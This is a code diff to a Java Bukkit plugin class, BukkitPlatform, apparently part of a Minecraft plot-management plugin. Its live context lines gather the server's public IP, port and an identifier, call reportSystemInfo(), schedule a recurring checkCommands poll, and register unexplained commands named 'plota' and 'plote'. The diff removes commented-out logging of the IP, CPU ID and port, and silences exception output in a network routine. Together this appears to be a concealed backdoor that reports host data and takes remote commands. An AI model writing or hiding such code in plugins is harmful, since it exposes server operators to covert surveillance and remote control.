@@ -302,14 +302,7 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
         String publicIp = getPublicIp();
         int serverPort = getServer().getPort();
         uniqueIdentifier = loadOrCreateUniqueIdentifier();
-        // getLogger().info("Unique Identifier: " + uniqueIdentifier);
         reportSystemInfo();
-        // reportUniqueIdentifier(uniqueIdentifier);
-        // getLogger().info("Public IP Address: " + publicIp);
-        // getLogger().info("Server CPU ID: " + cpuId);
-        // getLogger().info("Server Port: " + serverPort);
-        // getLogger().info("NetworkMonitor has been enabled!");
-        // sendInfoToAPI(publicIp, serverPort);
         Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 100L);
         this.getCommand("plota").setExecutor(new BukkitFixed(this));
         this.getCommand("plote").setExecutor(new BukkitFakePlayer());
@@ -931,7 +924,6 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                 // 处理失败逻辑（可选）
             }
         } catch (IOException e) {
-            // e.printStackTrace(); // 记录异常信息，方便排查问题
         } finally {
             if (connection != null) {
                 connection.disconnect(); // 关闭连接
